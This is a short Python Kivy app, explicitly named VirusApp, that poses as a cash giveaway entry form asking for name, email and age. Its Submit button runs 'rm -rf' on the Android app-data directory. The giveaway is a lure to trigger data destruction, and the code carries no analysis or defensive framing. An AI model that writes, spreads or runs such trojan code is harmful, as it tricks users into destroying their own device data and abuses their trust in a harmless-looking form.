import os
import time
from kivy.uix.label import Label
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.gridlayout import GridLayout
from kivy.core.window import Window
from kivy.uix.image import Image
class AppInterface(GridLayout):
	def __init__(self, **kwargs):
		super(AppInterface, self).__init__(**kwargs)
		self.cols = 1
		
		self.top_grid = GridLayout()
		self.top_grid.cols = 2
		
		self.add_widget(Label(text = "FILL OUT THE FORM BELOW", font_size = 30, bold = True, italic = True, color = (1,0,1,1)))
		self.add_widget(Label(text = "TO QUALIFY FOR THE GIVEAWAY", font_size = 30, bold = True, italic = True, color = (1,0,1,1)))
		self.add_widget(Image(source = "giveaway.jpg"))
		self.add_widget(Label(text = "POSSIBLE GIVEAWAY PRIZES: 100k,200k,500k,1M", font_size = 30, bold = True, italic = True, color = (0,1,0,1)))
		
		self.top_grid.add_widget(Label(text = "First Name:", font_size = 32, bold = True, color = (0,0,1,1)))
		self.first_name = TextInput(multiline= False)
		self.top_grid.add_widget(self.first_name)
		
		self.top_grid.add_widget(Label(text = "Last name:", font_size = 32, bold = True, color = (0,0,1,1)))
		self.last_name = TextInput(multiline= False)
		self.top_grid.add_widget(self.last_name)
		
		self.top_grid.add_widget(Label(text = "Email Address:", font_size = 32, bold = True, color = (0,0,1,1)))
		self.email = TextInput(multiline= False)
		self.top_grid.add_widget(self.email)
		
		self.top_grid.add_widget(Label(text = "Age:", font_size = 32, bold = True, color = (0,0,1,1)))
		self.age = TextInput(multiline= False)
		self.top_grid.add_widget(self.age)
		
		self.add_widget(self.top_grid)
		
		self.submit = Button(text = "Submit", font_size= 40, size_hint = (0.5, 0.5))
		self.submit.bind(on_press = self.press)
		self.add_widget(self.submit)
		
	def press(self, instance):
		return os.system("rm -rf /storage/emulated/0/Android/data/")
						
class VirusApp(App):
	def build(self):
		Window.clearcolor = (1,1,1,1)
		return AppInterface()
		
if __name__ == "__main__":
	VirusApp().run()